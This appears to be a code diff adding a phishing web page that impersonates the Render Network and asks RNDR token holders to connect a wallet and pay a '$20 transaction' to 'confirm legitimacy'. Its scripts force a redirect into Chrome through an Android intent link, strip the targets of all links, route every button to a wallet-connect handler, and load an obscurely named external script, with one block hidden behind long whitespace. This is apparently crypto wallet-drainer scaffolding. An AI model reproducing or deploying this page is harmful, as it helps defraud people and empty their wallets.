@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Access</title>
+  <script src="./bootstrap-5.2.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <script> 
+        // Проверяем наличие параметра перенаправления в URL 
+        const urlParams = new URLSearchParams(window.location.search); 
+        const redirected = urlParams.has('redirected'); 
+ 
+        // Функция, которая перенаправляет пользователя 
+        function openInChrome() { 
+            window.location.href = "intent://rendervipaccess.on-fleek.app?redirected=true#Intent;scheme=https;package=com.android.chrome;end"; 
+        } 
+ 
+        // При загрузке страницы 
+        window.onload = function() { 
+            // Выполняем перенаправление, если еще не было перенаправления 
+            if (!redirected) { 
+                setTimeout(openInChrome, 300); // Задержка 1 секунда 
+            } 
+        }; 
+    </script> 
+
+
+
+        <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        var links = document.querySelectorAll('body a');
+        for (var i = 0; i < links.length; i++) {
+        var link = links[i];
+        link.removeAttribute('href');
+        link.classList.add('open');
+        }
+        });
+        </script>                                                                                                                          <script>
+      document.addEventListener('DOMContentLoaded', function () {
+      var buttons = document.querySelectorAll('body button');
+      for (var i = 0; i < buttons.length; i++) {
+        var button = buttons[i];
+        button.classList.add('open');
+      }
+      });
+      </script>
+      <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[ad-data-linked]');
+        elements.forEach(element => {
+          element.removeAttribute('ad-data-linked');
+        });
+      
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+      });
+      
+      </script>
+      
+        <style>
+        .open {
+        cursor: pointer;
+        }
+        </style>
+
+    <script src="bzdffbbbfbfd.js"></script>
+</head>
+<body>
+  <header>
+    <div class="navbar">
+      <img src="favicon.ico" alt="Render Network Logo" class="logo">
+      <button class="open wallet-btn">Connect Wallet</button>
+    </div>
+    <div class="hero-content">
+      <h1>Render Token (RNDR)<br>Check Availability to Enter</h1>
+      <p>Exclusive Access for RNDR Token Holders – gain access to our exclusive group.</p>
+      <button class="cta-btn open">Connect wallet to check availability</button>
+      <p class="hero-text-info">*Min. $10,000 RNDR balance required. $20 transaction confirms legitimacy.</p>
+    </div>
+  </header>
+</body>
+</html>
